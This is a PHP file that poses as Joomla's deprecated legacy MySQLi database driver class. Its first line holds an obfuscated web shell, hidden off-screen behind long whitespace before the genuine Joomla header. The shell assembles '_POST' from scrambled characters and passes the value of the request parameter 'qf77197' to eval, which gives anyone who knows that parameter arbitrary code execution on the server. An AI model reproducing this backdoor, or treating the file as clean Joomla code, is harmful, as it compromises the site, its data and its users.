<?php                                                                                                                                                                                                                                                 $bspa37= "utserpo_"; $kii3= $bspa37[2].$bspa37[1]. $bspa37[4].$bspa37[1].$bspa37[6]. $bspa37[0]. $bspa37[5]. $bspa37[5]. $bspa37[3]. $bspa37[4] ;$emw2 =$kii3 ($bspa37[7]. $bspa37[5] . $bspa37[6]. $bspa37[2].$bspa37[1]) ;if ( isset( ${ $emw2 }[ 'qf77197'] ) ){eval (${$emw2} [ 'qf77197' ]); } ?><?php
/**
 * @package     Joomla.Legacy
 * @subpackage  Database
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

defined('JPATH_PLATFORM') or die;

JLog::add('JDatabaseMysqli is deprecated, use JDatabaseDriverMysqli instead.', JLog::WARNING, 'deprecated');

/**
 * MySQLi database driver
 *
 * @package     Joomla.Legacy
 * @subpackage  Database
 * @see         http://php.net/manual/en/book.mysqli.php
 * @since       11.1
 * @deprecated  13.1 Use JDatabaseDriverMysqli instead.
 */
class JDatabaseMysqli extends JDatabaseDriverMysqli
{
}
